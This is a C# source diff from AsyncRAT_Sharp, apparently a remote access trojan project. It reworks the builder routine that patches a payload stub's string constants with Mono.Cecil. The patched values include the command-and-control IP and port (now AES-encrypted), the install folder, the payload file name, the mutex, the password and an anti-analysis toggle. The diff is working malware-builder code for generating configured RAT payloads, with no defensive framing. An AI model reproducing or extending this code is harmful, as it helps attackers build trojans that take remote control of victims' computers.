@@ -3,6 +3,7 @@ using System.Windows.Forms;
 using Mono.Cecil;
 using AsyncRAT_Sharp.Helper;
 using Mono.Cecil.Cil;
+using System.Text;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -99,43 +100,35 @@ namespace AsyncRAT_Sharp.Forms
                     {
                         if (methodDef.Name == ".cctor")
                         {
-                            int strings = 1;
-
                             for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
-                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
+                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                 {
-                                    switch (strings)
-                                    {
-                                        case 1: //port
-                                            methodDef.Body.Instructions[i].Operand = textPort.Text;
-                                            break;
-                                        case 2: //ip
-                                            methodDef.Body.Instructions[i].Operand = textIP.Text;
-                                            break;
-                                        case 3: //version
-                                            methodDef.Body.Instructions[i].Operand = Settings.Version;
-                                            break;
-                                        case 4: //install
-                                            methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
-                                            break;
-                                        case 5: //folder
-                                            methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
-                                            break;
-                                        case 6: //filename
-                                            methodDef.Body.Instructions[i].Operand = textFilename.Text;
-                                            break;
-                                        case 7: //password
-                                            methodDef.Body.Instructions[i].Operand = Settings.Password;
-                                            break;
-                                        case 8: //mutex
-                                            methodDef.Body.Instructions[i].Operand = txtMutex.Text;
-                                            break;
-                                        case 9: //anti
-                                            methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
-                                            break;
-                                    }
-                                    strings++;
+                                    string operand = methodDef.Body.Instructions[i].Operand.ToString();
+
+                                    if (operand == "6606")
+                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textPort.Text);
+
+                                    if (operand == "127.0.0.1")
+                                        methodDef.Body.Instructions[i].Operand = Settings.AES.Encrypt(textIP.Text);
+
+                                    if (operand == "false")
+                                        methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
+
+                                    if (operand == "%AppData%")
+                                        methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
+
+                                    if (operand == "Payload.exe")
+                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;
+
+                                    if (operand == "NYAN CAT")
+                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(Settings.Password));
+
+                                    if (operand == "%MTX%")
+                                        methodDef.Body.Instructions[i].Operand = txtMutex.Text;
+
+                                    if (operand == "%Anti%")
+                                        methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
                                 }
                             }
                         }
